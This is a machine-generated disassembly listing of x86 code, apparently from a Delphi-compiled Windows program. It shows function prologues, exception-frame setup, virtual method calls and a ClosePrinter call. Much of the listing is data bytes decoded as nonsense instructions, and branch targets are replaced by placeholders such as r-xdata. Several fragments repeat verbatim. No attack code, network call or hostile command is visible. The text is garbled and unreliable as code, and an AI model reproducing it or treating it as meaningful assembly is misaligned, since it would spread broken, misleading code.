inc ebx
xor edi edi
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c060
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42b484
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a20
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
jae r-xdata
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
dec [ ebx + 0x42c0a8c0 ]
add bh bh
sub_42c375
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x6d ] dl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add eax ebx
inc edx
add [ 0x170042c3 ] cl
retn
cmp bh [ ebx ]
retn
sub_42c3aa
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
les eax [ edx ]
xor [ eax ] al
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add al cl
iretd
sub_42c430
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42c4a6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42c5bc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405a20
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c4ad
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c548
mov [ rw-data ] eax
sub_42c4b4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c548
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405a4c
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42c50c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405a20
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42c548
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b3f0
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b3f0
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b3f0
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403fa4
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42c5bc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c6bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c50c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42b4a0
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405a08
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d798
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405a08
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d798
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c50c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42b4a0
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c50c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42b4a0
mov ecx r-xdata
call sub_405a4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c6c4
lea eax [ ebp - 0xc ]
call sub_405a08
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
sub edx 0xfffffff8
sub_42c6dc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42b484
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42c71c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42b484
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42c74c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42c8de
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42b484
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c879
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c8e5
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42b484
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
mov eax esi
xor edx edx
call sub_42b484
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42b484
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403254
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42b484
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42c8ec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42c9d1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c9d8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a58
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42b484
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a20
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42b484
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a20
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42cc08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42ccfb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403ff8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd02
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a58
lea eax [ ebp - 0x10 ]
call sub_405a08
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42b484
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405a20
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42cd20
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42cdff
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ff8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce06
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a58
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42b484
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a20
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42ce20
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a7c
xor eax eax
push ebp
push sub_42ce6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce76
lea eax [ ebx + 0xc ]
call sub_405a08
sub_42ce7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404454
xor eax eax
push ebp
push sub_42cf11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403ff8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42cc08
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf18
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
call sub_42c71c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42c74c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42c8ec
sub_42cf3c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42b484
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42b484
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a4c0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42b484
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41a4c0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41a4c0
sub_42cfc8
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_42c6dc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403254
mov eax [ esi + 0x14 ]
call sub_403254
mov eax [ esi + 0x10 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405a08
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42d01c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d053
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d05a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42d084
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d0a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0b0
retn
sub_42d0c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl dl
inc edx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
or [ ebp + 0x50 ] al
jb r-xdata
imul ebp [ esi + 0x74 ] 0x56907265
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
outsb
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
jb r-xdata
jb r-xdata
cmp [ edx ] 0x20
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ ss : edx ] cl
outsb
je r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_42d0b0
retn
inc eax
inc edx
mov esi edx
jmp r-xdata
retn 0x8
outsb
je r-xdata
adc [ eax ] al
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] al
add [ eax ] al
add al 0x11
inc eax
add [ eax ] cl
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
rol [ edx ] cl
jb r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
pop ebp
jb r-xdata
add [ eax - 0x2f ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2f ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x2f ] dh
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
push 0xe0042d3
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax ] bl
add [ eax ] al
add [ eax ] cl
push esp
push eax
imul ebp [ esi + 0x74 ] 0x408d7265
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
call sub_40419c
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
mov eax edi
pop edi
pop esi
pop ebx
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42d31b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40419c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4043b0
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40419c
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_40419c
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_403578
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d322
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40419c
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4043b0
je r-xdata
sub_42d17c
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42d1cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xd2
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
rol [ edx ] cl
adc [ eax ] al
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] al
add [ eax ] al
add al 0x11
inc eax
add [ eax ] cl
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
retn 0x8
outsb
je r-xdata
pop ebp
jb r-xdata
call sub_40419c
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42d31b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40419c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4043b0
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40419c
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_40419c
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_403578
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d322
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40419c
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4043b0
je r-xdata
sub_42d248
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40419c
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_40419c
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_40419c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42d2a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42d31b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40419c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4043b0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d322
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40419c
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4043b0
je r-xdata
sub_42d32c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42d368
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_42d3e4
mov eax esi
call sub_42ddd8
mov eax esi
call sub_42de14
mov eax [ esi + 0x4 ]
call sub_403254
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_42d580
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
push eax
